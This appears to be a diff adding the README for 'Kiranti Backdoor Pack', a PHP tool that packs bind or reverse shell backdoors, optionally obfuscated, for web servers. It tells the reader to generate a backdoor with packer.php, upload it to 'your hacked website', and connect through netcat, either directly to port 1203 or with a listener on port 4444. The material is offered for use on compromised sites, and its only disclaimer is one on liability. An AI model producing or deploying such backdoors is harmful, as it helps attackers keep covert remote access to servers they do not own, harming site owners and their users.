@@ -1,0 +1,38 @@
+                          _
+ _     _                 | |  _
+| | __(_)_ __  __ _ _ __ | |_(_)
+| |/ /| | '__|/ _` | '_ \| __| |
+|   < | | |  | (_| | | | | |_| |
+|_|\_\|_|_|   \__,_|_| |_|\__|_|
+                    Version: 1.0
+
+Kiranti Backdoor Pack
+
+This is a project for backdooring webserver without using web-based shell
+
+#How To Use
+* Download this project
+* Generate your own backdoor with: 
+```
+$ php packer.php -o filename.php -t [raw|obfuscate] -b [bind|reverse]
+```
+* Upload to your hacked website and access
+* We will use netcat for connect to our backdoor
+
+for bind connect:
+```
+nc -v [server ip] 1203
+```
+
+for reverse connect:
+```
+nc -lvp 4444
+```
+
+PS: 1203 and 4444 is default port
+
+I use Carbylamine Encoder for obfuscate the backdoor (but the source code is attached)
+
+#Disclaimer
+
+I as the author assume no liability and not responsible for any misused this projecthacked
